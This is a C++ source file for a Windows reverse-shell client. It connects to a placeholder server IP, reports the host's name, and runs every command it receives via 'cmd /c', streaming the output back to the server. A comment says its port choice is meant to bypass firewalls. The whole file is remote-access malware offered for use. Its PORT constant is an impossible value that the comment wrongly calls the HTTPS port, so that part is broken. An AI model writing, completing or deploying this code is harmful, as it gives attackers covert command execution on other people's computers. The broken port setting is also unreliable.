#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <stdio.h>


#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define RESET "\033[0m"

//Change This with You current Server Ip
#define SERVER_IP "IP_PLACEHOLDER"  
#define PORT 10293847576

void active_ansi()
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    if (!SetConsoleMode(hOut, dwMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING))
    {
        printf("ANSI not supported\n");
    }
    return ;
}

static void exec_cmd_and_send(SOCKET sock, char *cmd)
{
    FILE *fp;
    char buffer[1024];
    char full_cmd[1100];

    cmd[strcspn(cmd, "\r\n")] = '\0';

    snprintf(full_cmd, sizeof(full_cmd), "cmd /c %s 2>&1", cmd);
    printf("[EXEC] %s\n", cmd);

    fp = _popen(full_cmd, "r");
    if (!fp)
        return;

    while (fgets(buffer, sizeof(buffer), fp))
    {
        send(sock, buffer, strlen(buffer), 0);
    }

    send(sock, "[END]\n", 6, 0);

    _pclose(fp);
}

static void send_hostname(SOCKET sock)
{
    char hostname[256];

    if (gethostname(hostname, sizeof(hostname)) == 0)
    {
        char msg[300];
        snprintf(msg, sizeof(msg), "[HOST]%s\n", hostname);
        send(sock, msg, strlen(msg), 0);
    }
}

int main()
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;
    active_ansi();

    // permet de choisir la version
    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested,&wsaData);
    if (err != 0)
    {
        printf("[-] WSAStartup failed\n");
        return (0);
    }
    printf("[+] Winsock initialized\n");
    
    int af = AF_INET; // IPV4
    int type = SOCK_STREAM; // TCP
    int protocol = 0; // Auto mais ducoup sa choisir TCP
    SOCKET sock;
    sock = socket(af, type, protocol);
    if (sock == INVALID_SOCKET)
    {
        printf("[-] socket failed\n");
        return (1);
    }
    printf("[+] Socket initialized\n");

    struct sockaddr_in saServer;
    saServer.sin_family = AF_INET;
    saServer.sin_addr.s_addr = inet_addr(SERVER_IP);
    saServer.sin_port = htons((int)PORT); // port HTTPS pour bypass firewall
    if (connect(sock, (struct sockaddr*)&saServer, sizeof(saServer)) == SOCKET_ERROR)
    {
        printf(RED "[-] connect failed\n" RESET);
        Sleep(1000);
        return (1);
    }
    printf("[+] Connect initialized!\n");
    send_hostname(sock);
    printf(GREEN "[+] Connected to server!\n" RESET);
    char buffer[1024];
    while (true)
    {
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0)
        {
            printf("[-] Recv Failed\n");
            break;
        }
        else
        {
            buffer[bytes] = '\0';
            exec_cmd_and_send(sock, buffer);
        }
    }
    closesocket(sock);
    WSACleanup();
    return (0);
}